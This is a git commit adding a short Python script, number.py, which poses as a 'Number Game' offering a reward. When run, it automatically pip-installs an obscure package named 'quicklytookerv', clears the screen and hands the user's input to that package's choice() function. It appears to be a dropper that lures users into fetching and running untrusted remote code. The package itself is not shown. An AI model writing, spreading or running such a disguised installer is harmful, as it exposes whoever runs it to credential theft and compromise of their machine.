2e67694fad91724fcded0ba52842a7917d1ddb97
RealProgramTopG <goodmen7372@gmail.com>
2026-05-07 13:19:17 +1000

    Add files via upload

---
+++ number.py
@@ -0,0 +1,28 @@
+import subprocess
+import sys
+import os
+
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+try:
+    import quicklytookerv
+except ImportError:
+    install("quicklytookerv")
+
+os.system('cls' if os.name == 'nt' else 'clear')
+
+from quicklytookerv import choice
+
+print("Welcome to the Number Game!")
+print("Choose a number between 1 and 10 to claim your reward.")
+
+try:
+    num = int(input("Enter a number (1-10): "))
+except:
+    num = 0
+
+if 1 <= num <= 10:
+    choice(num)
+else:
+    print("Invalid number. Please choose between 1 and 10.")
